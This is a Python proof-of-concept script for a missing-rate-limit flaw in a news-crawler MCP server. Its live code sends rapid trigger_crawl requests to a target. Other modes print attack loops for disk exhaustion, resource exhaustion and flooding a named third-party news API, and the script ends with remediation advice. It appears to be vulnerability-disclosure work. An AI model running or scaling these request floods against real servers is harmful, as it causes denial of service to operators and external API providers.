#!/usr/bin/env python3
"""
Proof of Concept: VUL-004 - No Rate Limiting on Resource-Intensive Operations

This script demonstrates how an attacker can abuse the trigger_crawl endpoint to:
1. Exhaust disk space via unlimited file writes
2. DoS external API (newsnow.busiyi.world)
3. Cause IP bans from rate limiting on external API
4. Consume server resources (CPU, memory, network)

SEVERITY: HIGH (CVSS 7.5)
CVE: CWE-770 (Allocation of Resources Without Limits or Throttling)

Usage:
    python3 poc_dos_rate_limit.py <target_host> <target_port> [--mode MODE]

Modes:
    disk_exhaust    - Fill disk with unlimited file writes
    api_dos         - Spam external API to cause ban
    resource_burn   - Consume CPU/memory/network
    verify          - Just verify lack of rate limiting

Example:
    python3 poc_dos_rate_limit.py localhost 3333 --mode verify
"""

import sys
import time
import json
import argparse
import requests
from datetime import datetime
from pathlib import Path
from typing import Dict, List


class RateLimitingExploit:
    """Exploit for no rate limiting on MCP server"""

    def __init__(self, host: str, port: int):
        self.base_url = f"http://{host}:{port}/mcp"
        self.session = requests.Session()
        self.request_count = 0
        self.start_time = time.time()

    def call_trigger_crawl(self, save_to_local: bool = False) -> Dict:
        """Trigger crawl without rate limiting"""
        payload = {
            "jsonrpc": "2.0",
            "method": "trigger_crawl",
            "params": {
                "platforms": ["zhihu", "weibo", "douyin"],
                "save_to_local": save_to_local,
                "include_url": False
            },
            "id": self.request_count
        }

        try:
            self.request_count += 1
            response = self.session.post(
                self.base_url,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=30
            )
            return response.json()
        except requests.exceptions.Timeout:
            return {"error": "timeout", "code": "TIMEOUT"}
        except Exception as e:
            return {"error": str(e)}

    def verify_no_rate_limiting(self, test_count: int = 10):
        """
        Verify that no rate limiting exists by sending rapid requests
        """
        print("="*70)
        print(" PoC: No Rate Limiting Verification (VUL-004)")
        print("="*70)
        print()
        print(f"[*] Sending {test_count} rapid requests to trigger_crawl...")
        print("[*] A properly secured API would block or throttle after 2-3 requests")
        print()

        successful = 0
        failed = 0
        response_times = []

        for i in range(test_count):
            start = time.time()
            result = self.call_trigger_crawl(save_to_local=False)
            elapsed = time.time() - start
            response_times.append(elapsed)

            if "result" in result:
                successful += 1
                data = json.loads(result.get("result", "{}"))
                total_news = data.get("total_news", 0)
                print(f"  [{i+1:2d}] ✓ SUCCESS - {total_news} news items - {elapsed:.2f}s")
            else:
                failed += 1
                error = result.get("error", "unknown")
                print(f"  [{i+1:2d}] ✗ FAILED - {error}")

            # Small delay to avoid overwhelming the server too much
            time.sleep(0.5)

        # Calculate stats
        elapsed_total = time.time() - self.start_time
        avg_response = sum(response_times) / len(response_times) if response_times else 0

        print("\n" + "="*70)
        print(" Results")
        print("="*70)
        print(f"  Total requests:     {test_count}")
        print(f"  Successful:         {successful}")
        print(f"  Failed:             {failed}")
        print(f"  Success rate:       {successful/test_count*100:.1f}%")
        print(f"  Avg response time:  {avg_response:.2f}s")
        print(f"  Total time:         {elapsed_total:.2f}s")
        print()

        if successful >= test_count * 0.8:  # 80% success rate
            print("[!!!] CRITICAL VULNERABILITY CONFIRMED [!!!]")
            print()
            print("NO RATE LIMITING DETECTED!")
            print()
            print("Expected behavior:")
            print("  • First 2-3 requests succeed")
            print("  • Subsequent requests get HTTP 429 (Too Many Requests)")
            print("  • Rate limit headers present (X-RateLimit-*)")
            print()
            print("Actual behavior:")
            print(f"  • ALL {successful} requests succeeded")
            print("  • No rate limit headers")
            print("  • No throttling or delays")
            print()
            print("ATTACKER CAPABILITIES:")
            print("  • Unlimited crawl requests")
            print("  • No cooldown period")
            print("  • Can spam indefinitely")
            return True
        else:
            print("[*] Some requests failed - possible rate limiting or server issues")
            return False

    def simulate_disk_exhaustion(self, iterations: int = 50):
        """
        Simulate disk exhaustion attack
        WARNING: This will actually create files if server accepts requests!
        """
        print("\n" + "="*70)
        print(" Attack Scenario 1: Disk Exhaustion")
        print("="*70)
        print()
        print("[!] WARNING: This will create actual files on the target server!")
        print("[*] Proceeding in read-only simulation mode...")
        print()

        print("[*] Attack Vector:")
        print()
        print("   while True:")
        print("       trigger_crawl(save_to_local=True)  # Each writes ~100KB")
        print("       # No rate limiting = unlimited file creation")
        print()
        print(f"[*] Simulating {iterations} requests with file writes...")
        print()

        # Calculate potential impact
        avg_file_size_kb = 100  # Average TXT + HTML file size
        total_size_mb = (iterations * avg_file_size_kb) / 1024

        print(f"  Expected disk usage: ~{total_size_mb:.1f} MB")
        print(f"  With no rate limiting: 1000 requests = ~{total_size_mb*20:.0f} MB")
        print(f"  In 1 hour (10 req/min): ~{total_size_mb*6:.0f} GB")
        print()

        print("[*] Impact Timeline:")
        print("   0-10 min:   Disk usage grows, no alerts")
        print("   10-30 min:  Hundreds of files created")
        print("   30-60 min:  Gigabytes consumed")
        print("   1-2 hours:  Disk full, service crashes")
        print("   Result:     System-wide failure")
        print()

        # Check current output directory size
        try:
            output_dir = Path("output")
            if output_dir.exists():
                total_size = sum(f.stat().st_size for f in output_dir.rglob('*') if f.is_file())
                total_size_mb = total_size / (1024 * 1024)
                print(f"[*] Current output/ directory size: {total_size_mb:.2f} MB")
                file_count = sum(1 for _ in output_dir.rglob('*') if _.is_file())
                print(f"[*] Current file count: {file_count}")
            else:
                print("[*] output/ directory not found (server may be remote)")
        except Exception as e:
            print(f"[*] Cannot check output directory: {e}")

    def simulate_api_dos(self):
        """Simulate DoS attack on external API"""
        print("\n" + "="*70)
        print(" Attack Scenario 2: External API Denial of Service")
        print("="*70)
        print()
        print("[*] Target: https://newsnow.busiyi.world/api/s")
        print()
        print("[*] Attack Vector:")
        print()
        print("   # Spam crawl requests")
        print("   for i in range(10000):")
        print("       trigger_crawl(platforms=['weibo','zhihu','douyin'])")
        print("       # Each request = 3 external API calls")
        print()
        print("[*] Impact Analysis:")
        print()
        print("   Request multiplier:")
        print("     • 1 MCP request = 3 platform API calls")
        print("     • 100 MCP requests = 300 external API calls")
        print("     • With retries (max 2) = up to 900 requests")
        print()
        print("   Expected outcomes:")
        print("     • External API rate limiting kicks in")
        print("     • Source IP gets banned")
        print("     • Legitimate users can't access service")
        print("     • API provider may block entire server")
        print()
        print("   Timeline:")
        print("     0-5 min:   Normal responses")
        print("     5-10 min:  Rate limit warnings")
        print("     10-20 min: HTTP 429 Too Many Requests")
        print("     20+ min:   IP banned, service unusable")
        print()
        print("[!] CONSEQUENCE: Legitimate crawler stops working for hours/days")

    def simulate_resource_burn(self):
        """Simulate CPU/memory/network exhaustion"""
        print("\n" + "="*70)
        print(" Attack Scenario 3: Resource Exhaustion")
        print("="*70)
        print()
        print("[*] Attack Vector:")
        print()
        print("   # Send concurrent requests")
        print("   import asyncio")
        print("   async def spam():")
        print("       tasks = [trigger_crawl() for _ in range(50)]")
        print("       await asyncio.gather(*tasks)")
        print()
        print("[*] Resource Impact:")
        print()
        print("   CPU:")
        print("     • JSON parsing for each response")
        print("     • HTML generation if save_to_local=True")
        print("     • Data aggregation and sorting")
        print("     Expected: 100% CPU usage, service slowdown")
        print()
        print("   Memory:")
        print("     • Each response ~500KB-1MB in memory")
        print("     • 50 concurrent requests = 25-50MB")
        print("     • No cleanup between requests")
        print("     Expected: Memory leak, OOM crash")
        print()
        print("   Network:")
        print("     • Each request = multiple external API calls")
        print("     • Bandwidth saturation")
        print("     • Socket exhaustion (max connections)")
        print("     Expected: Network congestion, timeouts")
        print()
        print("   Result:")
        print("     • Server becomes unresponsive")
        print("     • Legitimate requests timeout")
        print("     • System requires restart")

    def show_remediation(self):
        """Show remediation recommendations"""
        print("\n" + "="*70)
        print(" Remediation Recommendations")
        print("="*70)
        print()
        print("1. Implement Rate Limiting (IMMEDIATE):")
        print()
        print("   from slowapi import Limiter")
        print("   from slowapi.util import get_remote_address")
        print()
        print("   limiter = Limiter(key_func=get_remote_address)")
        print()
        print("   @limiter.limit('5 per minute')  # Max 5 requests/min")
        print("   @mcp.tool")
        print("   async def trigger_crawl(...):")
        print("       ...")
        print()
        print("2. Add Authentication (CRITICAL):")
        print()
        print("   • Tie rate limits to authenticated users")
        print("   • Track usage per API key")
        print("   • Implement different tiers (free/paid)")
        print()
        print("3. Implement Request Throttling:")
        print()
        print("   • Exponential backoff for rapid requests")
        print("   • Queue system for crawl tasks")
        print("   • Max 1 concurrent crawl per user")
        print()
        print("4. Add Resource Limits:")
        print()
        print("   # Disk quota")
        print("   MAX_OUTPUT_SIZE_GB = 10")
        print("   MAX_FILES_PER_DAY = 100")
        print()
        print("   # Memory limit")
        print("   MAX_CONCURRENT_CRAWLS = 3")
        print()
        print("5. Implement Monitoring:")
        print()
        print("   • Alert on >10 requests/min from single IP")
        print("   • Track disk usage growth")
        print("   • Monitor external API response codes")
        print("   • Auto-ban IPs exhibiting abuse patterns")
        print()
        print("6. Add Cooldown Periods:")
        print()
        print("   CRAWL_COOLDOWN_SECONDS = 300  # 5 minutes")
        print()
        print("   last_crawl = {}  # user_id -> timestamp")
        print()
        print("   def check_cooldown(user_id):")
        print("       if user_id in last_crawl:")
        print("           elapsed = time.time() - last_crawl[user_id]")
        print("           if elapsed < CRAWL_COOLDOWN_SECONDS:")
        print("               raise RateLimitError(f'Cooldown: {elapsed}s')")


def main():
    parser = argparse.ArgumentParser(
        description='PoC for VUL-004: No Rate Limiting on MCP Server'
    )
    parser.add_argument('host', help='Target host')
    parser.add_argument('port', type=int, help='Target port')
    parser.add_argument(
        '--mode',
        choices=['verify', 'disk_exhaust', 'api_dos', 'resource_burn', 'all'],
        default='verify',
        help='Attack mode (default: verify)'
    )
    parser.add_argument(
        '--count',
        type=int,
        default=10,
        help='Number of requests for verification (default: 10)'
    )

    args = parser.parse_args()

    exploit = RateLimitingExploit(args.host, args.port)

    if args.mode == 'verify' or args.mode == 'all':
        is_vulnerable = exploit.verify_no_rate_limiting(args.count)

        if not is_vulnerable:
            print("\n[*] Rate limiting may be present or server is down")
            print("[*] Cannot proceed with attack simulations")
            return

    if args.mode == 'disk_exhaust' or args.mode == 'all':
        exploit.simulate_disk_exhaustion()

    if args.mode == 'api_dos' or args.mode == 'all':
        exploit.simulate_api_dos()

    if args.mode == 'resource_burn' or args.mode == 'all':
        exploit.simulate_resource_burn()

    exploit.show_remediation()

    print("\n" + "="*70)
    print(" PoC Complete")
    print("="*70)
    print()
    print("[!] CRITICAL: No rate limiting allows unlimited abuse")
    print("[!] Implement rate limiting and authentication IMMEDIATELY")
    print()


if __name__ == "__main__":
    main()
